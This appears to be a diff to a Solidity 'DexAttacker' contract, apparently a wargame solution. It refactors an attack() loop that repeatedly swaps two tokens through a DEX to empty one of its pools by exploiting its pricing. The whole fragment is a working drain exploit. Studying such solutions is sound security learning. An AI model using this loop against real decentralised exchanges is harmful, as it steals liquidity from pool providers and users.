@@ -17,27 +17,29 @@ contract DexAttacker {
     return (to, from);
   }
 
+  function min(uint256 x, uint256 y) internal pure returns (uint256) {
+    if (x > y) {
+      return y;
+    }
+    return x;
+  }
+
   function attack(IDex dex) public {
     address from = dex.token1();
     address to = dex.token2();
-    uint256 desiredSwapAmount;
-    uint256 balanceDexFrom;
+    uint256 swapAmount;
 
-    while (true) {
-      desiredSwapAmount = dex.balanceOf(from, address(this));
-      balanceDexFrom = dex.balanceOf(from, address(dex));
+    // keep swapping until we deplete either token in the dex
+    while (dex.balanceOf(to,   address(dex)) != 0 &&
+           dex.balanceOf(from, address(dex)) != 0) {
 
-      // keep your ask within the amounts in the dex
-      // we arrive here by solving x * (to/from) = to, for x
-      if (desiredSwapAmount > balanceDexFrom) {
-        desiredSwapAmount = balanceDexFrom;
-      }
+      // control to avoid the "Not enough to swap" error
+      swapAmount = min(
+        dex.balanceOf(from, address(this)),
+        dex.balanceOf(from, address(dex))
+      );
 
-      dex.swap(from, to, desiredSwapAmount);
-
-      if (dex.balanceOf(to, address(dex)) == 0) {
-        break;
-      }
+      dex.swap(from, to, swapAmount);
       (from, to) = swapAddresses(from, to);
     }
   }
